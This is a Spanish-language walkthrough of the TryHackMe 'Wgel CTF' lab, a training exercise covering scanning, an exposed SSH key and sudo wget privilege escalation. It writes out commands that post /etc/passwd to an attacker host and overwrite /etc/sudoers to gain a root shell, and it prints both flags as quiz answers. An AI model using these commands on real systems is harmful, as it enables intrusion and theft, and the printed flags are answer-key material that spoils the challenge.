# Máquina Wgel CTF

Dificultad --> Facil

Instrucciones --> **Para poder resolver esta máquina tienes que registrarte en la página de TryHackMe y buscarla por el nombre de Wgel CTF**

'

[![portada.jpg](https://i.postimg.cc/gJg4pPH4/portada.jpg)](https://postimg.cc/DJb1QHDb)


## 1.Reconocmiento

Realizamos un escaneo de puertos con la herramienta Nmap para verificar los puertos abiertos

[![reconocimiento.jpg](https://i.postimg.cc/rsbJdCbr/reconocimiento.jpg)](https://postimg.cc/8fRW9WTp)

[![reconocimiento1.jpg](https://i.postimg.cc/sf0K0sXg/reconocimiento1.jpg)](https://postimg.cc/t7Whs0WK)


### Resumen de la Información Obtenida

|IP            | Sistema OPerativo | Puertos/Servicios           | 
|:-----------: |:-----------------:| :--------------------------:| 
| 10.10.12.128 |  Linux            | 22 OpenSSH 7.2p2            |
|              |                   | 80 http Apache httpd 2.4.18 |


## 2. Análisis de Vulnerabilidades / Debilidades 🔍


Al tener el puerto 80 abierto, abrimos la dirección IP en el navegador e inspeccionamos la pagina. Conseguimos un posible usuario llamado jessie

![image](https://github.com/user-attachments/assets/aa660569-5d0c-4e79-abe7-873fed88ec9b)


Realizamos un fuzzing

![image](https://github.com/user-attachments/assets/f014751c-fc9f-4d1d-8686-3933ff4a2930)


![image](https://github.com/user-attachments/assets/f9e6de5f-ccaa-4236-b267-ab970ce4783f)

Realizamos otro fuzzing con el directorio /sistemap


![image](https://github.com/user-attachments/assets/d0c30ec0-c906-4165-beed-d93abfbcd312)


En el directorio /.ssh conseguimos una llave ssh la cual nos podrá permitir conectarnos. 

Descargamos el archivo y le damos permisos 600

![image](https://github.com/user-attachments/assets/b6ae4dc7-ad66-4eb1-8a45-ff3e4198f2c5)


## 3. Explotación 💥


Ahora nos conectamos por ssh utilizando el usuario jessie y la llave id_rsa

![image](https://github.com/user-attachments/assets/a20ac65c-0dc2-4b4d-a6e7-aa5dd9b44e05)


Una vez adentro nos vamos al directorio documents y encontramos la primera bandera 🚩

057c67131c3d5e42dd5cd3075b198ff6


![image](https://github.com/user-attachments/assets/5f71acc8-a817-49f9-9d11-9c2ae0447a3b)


## 4. Escalación de privilegios 🧗


Ahora vamos a proceder a escalar privilegios, ejecutando sudo -l encontramos que wget se puede ejecutar como root sin ninguna password


![image](https://github.com/user-attachments/assets/fbdec6f7-ac25-42fb-ad73-fe70c9d16075)


Buscamos por google como escalar privilegios a través de wget


![image](https://github.com/user-attachments/assets/126da625-beee-4e5a-86da-ed305e66ba31)


Levantamos un netcat en nuestra maquina y ejecutamos el siguiente comando en la máquina victima

    sudo /usr/bin/wget –post-file=/etc/passwd “IP ATACANTE”

![image](https://github.com/user-attachments/assets/638a3e41-cabf-4f28-86da-af12231d41df)


Mientras tanto en nuestra máquina recibimos un archivo


![image](https://github.com/user-attachments/assets/8d380e64-a9a6-4e81-a415-80a86d0f8ef9)


Copiamos toda esta información en una archivo que se va llamar sudoers

![image](https://github.com/user-attachments/assets/b20b7169-1352-4701-b696-ffd3f9a852c2)


Editamos la ultima parte donde sustituimos el binario wget por /bin/bash y así cuando se ejecute se nos creara una shell


![image](https://github.com/user-attachments/assets/995ee000-7cec-465a-ab5e-f02a3eaa6adf)


Volvemos activar un servidor http en nuestra máquina para poder descargar de vuelta el archivo en la máquina victima y ejecutamos el siguiente comando en la máquina victima

    sudo /usr/bin/wget http://10.11.86.141:8000/sudoers -O /etc/sudoers

![image](https://github.com/user-attachments/assets/4061e296-3571-4b28-acb8-9e44cef2070a)


Una vez descargado el archivo modificado en la máquina victima procedemos a ejecutar el siguiente comando

    sudo /bin/bash

Y tenemos acceso root


![image](https://github.com/user-attachments/assets/c48e927d-25b5-40f9-be7f-636086ee8ebb)


Ahora buscamos la siguiente bandera 🚩 en el directorio root

b1b968b37519ad1daa6408188649263d

![image](https://github.com/user-attachments/assets/d8779a3e-fba2-44b7-b55b-0176355f6a61)


## 5.Banderas 🏁

|user.txt | 057c67131c3d5e42dd5cd3075b198ff6  |
|:-------:|:---------------------------------:|
|root.txt | b1b968b37519ad1daa6408188649263d  |


## 6.Extra 🚨

Acá las respuesta del cuestionario de TryHackMe 


- User flag

057c67131c3d5e42dd5cd3075b198ff6

- Root flag

b1b968b37519ad1daa6408188649263d





























































































